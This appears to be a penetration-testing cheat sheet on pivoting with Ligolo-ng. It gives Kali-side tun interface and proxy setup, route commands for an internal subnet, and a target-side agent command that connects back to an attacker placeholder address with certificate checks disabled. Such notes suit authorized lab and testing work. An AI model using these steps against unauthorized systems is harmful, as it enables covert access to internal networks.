# Ligolo

{% embed url="https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5" %}

### Set up on kali:

{% code overflow="wrap" %}
```shell
# Adds a new tun interface to our machine.
sudo ip tuntap add user kali mode tun ligolo

# Enables the new interface.
sudo ip link set ligolo up
```
{% endcode %}

Run proxy on kali:

{% code overflow="wrap" %}
```sh
# With the -selfcert flag the tool dynamically 
# generates self-signed certificates.

./proxy -selfcert
```
{% endcode %}

### Set up on target

{% code overflow="wrap" %}
```powershell
./agent -connect {kali_ip}:11601 -ignore-cert
```
{% endcode %}

### Add route

```sh
sudo ip route add 10.10.138.0/24 dev ligolo
```

Confirm route was added:

```shell
ip route list
```

Start tunnel (in ligolo interface)

```
start
```

### Commands in ligolo session

List sessions:

```
session
```



